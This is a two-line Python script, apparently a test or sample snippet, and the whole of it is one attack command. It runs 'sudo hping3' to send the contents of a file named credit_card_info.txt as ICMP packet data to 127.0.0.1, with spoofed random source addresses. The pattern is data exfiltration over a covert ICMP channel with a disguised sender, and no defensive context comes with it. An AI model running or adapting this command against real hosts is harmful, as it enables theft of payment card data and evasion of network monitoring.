import os
os.system("sudo hping3 --file ./scripts/credit_card_info.txt --data 134 127.0.0.1 --icmp -c 1 --rand-source")
